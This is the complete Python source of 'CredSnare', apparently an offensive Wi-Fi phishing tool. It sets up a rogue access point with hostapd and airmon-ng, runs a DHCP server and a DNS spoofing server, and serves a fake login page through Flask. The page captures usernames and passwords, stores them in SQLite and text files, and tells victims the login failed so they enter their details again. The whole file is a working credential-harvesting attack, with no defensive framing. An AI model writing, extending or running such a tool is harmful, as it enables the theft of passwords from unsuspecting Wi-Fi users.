#!/usr/bin/env python3

import argparse
import logging
import sys
import time
import json
import os
import subprocess
import sqlite3
from concurrent.futures import ThreadPoolExecutor
from flask import Flask, request, render_template_string
import threading
import socket
import dns.resolver
import dns.message
import dns.rdataclass
import dns.rdatatype

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('credsnare.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

app = Flask(__name__)

class CredSnare:
    def __init__(self, interface: str, ssid: str, phishing_template: str, dns_spoof: bool, 
                 threads: int = 5, quiet: bool = False):
        self.interface = interface
        self.ssid = ssid
        self.phishing_template = phishing_template
        self.dns_spoof = dns_spoof
        self.threads = threads
        self.quiet = quiet
        self.output_dir = 'credsnare-output'
        self.output_file = os.path.join(self.output_dir, 
            f"snare_{ssid}_{time.strftime('%Y%m%d_%H%M%S')}.txt")
        self.json_file = os.path.join(self.output_dir, 
            f"snare_{ssid}_{time.strftime('%Y%m%d_%H%M%S')}.json")
        self.db_file = os.path.join(self.output_dir, 'credsnare.db')
        os.makedirs(self.output_dir, exist_ok=True)
        self.credentials = []
        self.dns_mappings = {'login.example.com': '192.168.1.1'}  # Example mapping
        self.init_db()
        if quiet:
            logging.getLogger().handlers = [logging.FileHandler('credsnare.log')]

    def init_db(self):
        """Initialize SQLite database for storing credentials."""
        with sqlite3.connect(self.db_file) as conn:
            cursor = conn.cursor()
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS credentials (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    username TEXT,
                    password TEXT,
                    timestamp TEXT
                )
            ''')
            conn.commit()

    def store_credential(self, username: str, password: str):
        """Store captured credentials in database."""
        timestamp = time.strftime('%Y-%m-%d %H:%M:%S')
        with sqlite3.connect(self.db_file) as conn:
            cursor = conn.cursor()
            cursor.execute(
                'INSERT INTO credentials (username, password, timestamp) VALUES (?, ?, ?)',
                (username, password, timestamp)
            )
            conn.commit()
        self.credentials.append({
            'username': username,
            'password': password,
            'timestamp': timestamp
        })

    def setup_ap(self):
        """Set up fake access point using hostapd."""
        logger.info(f"Setting up fake AP with SSID: {self.ssid}")
        hostapd_conf = f"""
interface={self.interface}
driver=nl80211
ssid={self.ssid}
hw_mode=g
channel=6
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
"""
        conf_path = os.path.join(self.output_dir, 'hostapd.conf')
        with open(conf_path, 'w') as f:
            f.write(hostapd_conf)

        try:
            subprocess.check_call(['airmon-ng', 'check', 'kill'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            subprocess.check_call(['airmon-ng', 'start', self.interface], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            subprocess.Popen(['hostapd', conf_path], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            logger.info("Fake AP started")
        except subprocess.CalledProcessError as e:
            logger.error(f"Failed to start fake AP: {e}")
            sys.exit(1)

    def setup_dhcp(self):
        """Set up DHCP server using dnsmasq."""
        logger.info("Setting up DHCP server")
        dnsmasq_conf = f"""
interface={self.interface}
dhcp-range=192.168.1.100,192.168.1.200,12h
"""
        conf_path = os.path.join(self.output_dir, 'dnsmasq.conf')
        with open(conf_path, 'w') as f:
            f.write(dnsmasq_conf)

        try:
            subprocess.Popen(['dnsmasq', '-C', conf_path], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            logger.info("DHCP server started")
        except subprocess.CalledProcessError as e:
            logger.error(f"Failed to start DHCP server: {e}")
            sys.exit(1)

    def dns_server(self):
        """Run fake DNS server for spoofing."""
        logger.info("Starting fake DNS server")
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.bind(('0.0.0.0', 53))

        while True:
            data, addr = sock.recvfrom(1024)
            request = dns.message.from_wire(data)
            response = dns.message.make_response(request)
            for question in request.question:
                qname = question.name.to_text()
                if qname in self.dns_mappings and self.dns_spoof:
                    response.answer.append(
                        dns.rrset.from_text(qname, 3600, dns.rdataclass.IN, dns.rdatatype.A, self.dns_mappings[qname])
                    )
                else:
                    try:
                        answers = dns.resolver.resolve(qname, 'A')
                        for rdata in answers:
                            response.answer.append(
                                dns.rrset.from_text(qname, 3600, dns.rdataclass.IN, dns.rdatatype.A, rdata.to_text())
                            )
                    except Exception:
                        pass
            sock.sendto(response.to_wire(), addr)

    def save_results(self):
        """Save captured credentials to files."""
        with open(self.output_file, 'a') as f:
            for cred in self.credentials:
                f.write(f"[{cred['timestamp']}] Username: {cred['username']}, Password: {cred['password']}\n")
            f.write(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] Snare run complete\n")

        with open(self.json_file, 'w') as f:
            json.dump({
                'ssid': self.ssid,
                'interface': self.interface,
                'credentials': self.credentials,
                'timestamp': time.strftime('%Y-%m-%d %H:%M:%S')
            }, f, indent=4)

        logger.info(f"Results saved to {self.output_file} and {self.json_file}")

    def run(self):
        """Run CredSnare phishing tool."""
        if not os.path.isfile(self.phishing_template):
            logger.error(f"Phishing template not found: {self.phishing_template}")
            sys.exit(1)

        logger.info(f"Starting CredSnare with SSID: {self.ssid}")
        self.setup_ap()
        self.setup_dhcp()

        # Start DNS server in a thread if spoofing enabled
        if self.dns_spoof:
            dns_thread = threading.Thread(target=self.dns_server)
            dns_thread.daemon = True
            dns_thread.start()

        # Start Flask server in a thread
        flask_thread = threading.Thread(target=lambda: app.run(host='0.0.0.0', port=80))
        flask_thread.daemon = True
        flask_thread.start()

        try:
            while True:
                time.sleep(1)  # Keep main thread alive
        except KeyboardInterrupt:
            logger.info("CredSnare stopped by user")
            self.save_results()
            subprocess.check_call(['airmon-ng', 'stop', f"{self.interface}mon"], 
                                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            sys.exit(0)

# Flask routes
@app.route('/', methods=['GET', 'POST'])
def phishing_page():
    credsnare = app.config['credsnare']
    if request.method == 'POST':
        username = request.form.get('username', '')
        password = request.form.get('password', '')
        logger.info(f"Credential captured: Username={username}, Password={password}")
        credsnare.store_credential(username, password)
        return render_template_string(
            open(credsnare.phishing_template).read(),
            message="Login failed. Please try again."
        )
    return render_template_string(open(credsnare.phishing_template).read())

def main():
    parser = argparse.ArgumentParser(
        description="CredSnare: A Wi-Fi phishing tool for credential harvesting.",
        epilog="Example: ./credsnare.py -i wlan0 -s FreeWiFi -p login.html --dns-spoof -T 5"
    )
    parser.add_argument('-i', '--interface', required=True, 
                       help="Wireless interface (e.g., wlan0)")
    parser.add_argument('-s', '--ssid', required=True, 
                       help="SSID for fake AP (e.g., FreeWiFi)")
    parser.add_argument('-p', '--phishing-template', default='login.html', 
                       help="Phishing template file (default: login.html)")
    parser.add_argument('--dns-spoof', action='store_true', 
                       help="Enable DNS spoofing")
    parser.add_argument('-T', '--threads', type=int, default=5, 
                       help="Number of threads (default: 5)")
    parser.add_argument('-q', '--quiet', action='store_true', 
                       help="Quiet mode (log to file only)")

    args = parser.parse_args()

    print("""
    ==============================
         CredSnare v1.0
      Wi-Fi Phishing Tool
    ==============================
    """)

    try:
        credsnare = CredSnare(
            interface=args.interface,
            ssid=args.ssid,
            phishing_template=args.phishing_template,
            dns_spoof=args.dns_spoof,
            threads=args.threads,
            quiet=args.quiet
        )
        app.config['credsnare'] = credsnare
        credsnare.run()
    except KeyboardInterrupt:
        logger.info("CredSnare interrupted by user")
        sys.exit(0)
    except Exception as e:
        logger.error(f"Error: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()